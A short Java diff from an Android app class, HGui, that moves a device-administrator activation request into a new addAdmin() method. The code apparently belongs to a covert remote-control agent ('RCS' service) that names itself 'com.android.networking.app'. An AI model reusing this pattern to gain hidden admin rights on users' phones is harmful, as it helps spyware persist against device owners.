@@ -35,6 +35,13 @@ public class HGui extends Activity {
 		DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
 		dpm.removeActiveAdmin(devAdminReceiver);
 	}
+	
+	public void addAdmin() {
+		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+		ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
+		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+		startActivityForResult(intent, ACTIVATION_REQUEST);
+	}
 
 	private void startService() {
 		final String service = "com.android.networking.app"; //$NON-NLS-1$
@@ -53,11 +60,8 @@ public class HGui extends Activity {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
 				}
-
-				Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-				ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
-				intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-				startActivityForResult(intent, ACTIVATION_REQUEST);
+				addAdmin();
+				
 			}
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
